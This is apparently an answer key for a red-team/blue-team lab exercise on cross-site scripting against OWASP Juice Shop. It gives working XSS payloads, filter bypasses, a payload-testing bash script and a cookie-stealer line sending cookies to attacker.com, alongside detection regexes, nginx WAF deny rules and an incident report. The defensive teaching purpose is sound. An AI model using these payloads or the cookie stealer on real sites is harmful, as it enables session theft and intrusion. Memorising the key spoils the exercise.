# Exercise 03 Answers: XSS Attack & Web Application Firewall

## 🔴 Red Team Answers

### Successful XSS Payloads

#### 1. Search Box (DOM XSS)
```html
<iframe src="javascript:alert('XSS')">
```
**URL:** `http://<VPS_IP>:8000/#/search?q=<iframe src="javascript:alert('XSS')">`

#### 2. Track Order (Reflected XSS)
```html
<iframe src="javascript:alert('XSS')">
```
**URL:** `http://<VPS_IP>:8000/#/track-result?id=<iframe src="javascript:alert('XSS')">`

#### 3. Without Script Tags
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### 4. Cookie Stealer
```javascript
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

### Bypass Techniques That Work

#### URL Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E
```

#### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

#### Without Script Tag (Most Reliable)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

#### Event Handler Variations
```html
<body/onload=alert(1)>
<div onmouseover=alert(1)>hover</div>
<input onblur=alert(1) autofocus><input autofocus>
```

### Complete XSS Attack Script

```bash
#!/bin/bash
# xss_attack.sh
TARGET="http://<VPS_IP>:8000"

declare -a PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg/onload=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "<body onload=alert(1)>"
    "<input onfocus=alert(1) autofocus>"
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "<ScRiPt>alert(1)</sCrIpT>"
)

echo "XSS Attack Testing"
echo "==================="

for payload in "${PAYLOADS[@]}"; do
    echo -n "Testing: ${payload:0:30}... "
    
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        "$TARGET/rest/products/search?q=$payload")
    
    if [ "$CODE" == "200" ]; then
        echo "✓ Passed (may be vulnerable)"
    elif [ "$CODE" == "403" ]; then
        echo "✗ Blocked by WAF"
    else
        echo "? Response: $CODE"
    fi
done
```

---

## 🔵 Blue Team Answers

### Detection Commands

#### Real-Time XSS Detection
```bash
tail -f ./logs/nginx/access.log | \
    grep -iE "(<script|javascript:|onerror=|onload=|<iframe|<svg)"
```

#### Count XSS Attempts
```bash
grep -ciE "(<script|javascript:|onerror|onload|<iframe|<svg|<img.*onerror)" \
    ./logs/nginx/access.log
```

#### Extract Unique Payloads
```bash
grep -oiE "q=[^& ]+" ./logs/nginx/access.log | \
    cut -d= -f2 | \
    python3 -c "import sys,urllib.parse; \
        [print(urllib.parse.unquote_plus(l.strip())) for l in sys.stdin]" | \
    sort -u
```

### Complete XSS Detection Script

```python
#!/usr/bin/env python3
# xss_detector.py

import re
import sys
from urllib.parse import unquote_plus

XSS_PATTERNS = [
    r'<script',
    r'javascript:',
    r'onerror\s*=',
    r'onload\s*=',
    r'onmouseover\s*=',
    r'onclick\s*=',
    r'onfocus\s*=',
    r'<iframe',
    r'<svg',
    r'<img[^>]+onerror',
    r'<body[^>]+onload',
    r'<input[^>]+onfocus',
    r'document\.cookie',
    r'eval\s*\(',
]

def detect_xss(log_line):
    """Check if log line contains XSS attempt"""
    decoded = unquote_plus(log_line)
    
    for pattern in XSS_PATTERNS:
        if re.search(pattern, decoded, re.IGNORECASE):
            return pattern
    return None

def main():
    xss_count = 0
    attacker_ips = {}
    
    log_file = sys.argv[1] if len(sys.argv) > 1 else './logs/nginx/access.log'
    
    with open(log_file, 'r') as f:
        for line in f:
            pattern = detect_xss(line)
            if pattern:
                xss_count += 1
                # Extract IP (first field)
                ip = line.split()[0] if line.split() else 'unknown'
                attacker_ips[ip] = attacker_ips.get(ip, 0) + 1
                print(f"[XSS] Pattern: {pattern}")
                print(f"      IP: {ip}")
                print(f"      Line: {line.strip()[:100]}...")
                print()
    
    print(f"\n=== Summary ===")
    print(f"Total XSS attempts: {xss_count}")
    print(f"\nTop attackers:")
    for ip, count in sorted(attacker_ips.items(), key=lambda x: -x[1])[:5]:
        print(f"  {ip}: {count} attempts")

if __name__ == '__main__':
    main()
```

### WAF Rules for Nginx

```nginx
# /etc/nginx/conf.d/waf_xss.conf

# XSS blocking location block
location / {
    # Block script tags (normal and encoded)
    if ($request_uri ~* "(<script|%3Cscript|%253Cscript)") {
        return 403;
    }
    
    # Block javascript: protocol
    if ($request_uri ~* "(javascript:|javascript%3A)") {
        return 403;
    }
    
    # Block event handlers
    if ($request_uri ~* "(onerror|onload|onmouseover|onclick|onfocus|onblur)(\s|%20)*=") {
        return 403;
    }
    
    # Block iframe injection
    if ($request_uri ~* "(<iframe|%3Ciframe)") {
        return 403;
    }
    
    # Block SVG XSS
    if ($request_uri ~* "(<svg|%3Csvg)") {
        return 403;
    }
    
    # Block document.cookie access
    if ($request_uri ~* "document(\.|\%2E)cookie") {
        return 403;
    }
    
    # Add security headers
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
    
    proxy_pass http://juice-shop:3000;
}
```

### Sample Incident Report

```
XSS ATTACK INCIDENT REPORT
==========================

Detection Time: 16:45
Attacker IP: 192.168.1.100
Attack Duration: 12 minutes

Attack Statistics:
- Total XSS attempts: 47
- Unique payloads: 12
- Blocked by WAF: 38
- Potentially successful: 9 (before WAF)

Attack Types:
- Script tag injection: 15
- Event handler (onerror): 18
- JavaScript protocol: 8
- SVG injection: 6

Vulnerable Endpoints Found:
1. /rest/products/search (reflected)
2. /#/track-result (DOM-based)
3. /#/search (DOM-based)

Successful Payloads (Before WAF):
1. <iframe src="javascript:alert('XSS')">
2. <img src=x onerror=alert(1)>
3. <svg/onload=alert(1)>

Response Timeline:
- 16:45 - XSS attempts detected in logs
- 16:50 - Attack pattern confirmed
- 16:55 - WAF rules implemented
- 17:00 - Attacker IP blocked
- 17:02 - Attack stopped

WAF Rules Implemented:
- Blocked <script> tags (encoded variants)
- Blocked javascript: protocol
- Blocked event handlers
- Added X-XSS-Protection header
- Added Content-Security-Policy

Recommendations:
1. Implement output encoding on all user input
2. Use Content-Security-Policy headers (strict)
3. Validate and sanitize input server-side
4. Use HttpOnly flag on all cookies
5. Conduct security code review
6. Consider DOM sanitization library (DOMPurify)
```

---

## 🎓 Learning Points

### XSS Types Explained

| Type | Location | Example |
|------|----------|---------|
| **Reflected** | Server response | Search results page |
| **Stored** | Database | Comments, profiles |
| **DOM-based** | Browser JS | URL fragments |

### Defense Layers

1. **Input Validation**
   - Whitelist allowed characters
   - Reject or encode special chars

2. **Output Encoding**
   - HTML encode: `&lt;script&gt;`
   - JavaScript encode in JS contexts
   - URL encode in URLs

3. **Content Security Policy**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **HttpOnly Cookies**
   - Prevents JavaScript access to cookies
   - Mitigates cookie theft

5. **WAF Rules**
   - Block known patterns
   - Rate limit suspicious requests

### Why WAF Alone Isn't Enough

```
Bypass: <img src=x onerror=alert(1)>
Bypass: <svg/onload=alert(1)>
Bypass: URL encoding, case variations, etc.
```

**Best Defense:** Fix the code + WAF as additional layer
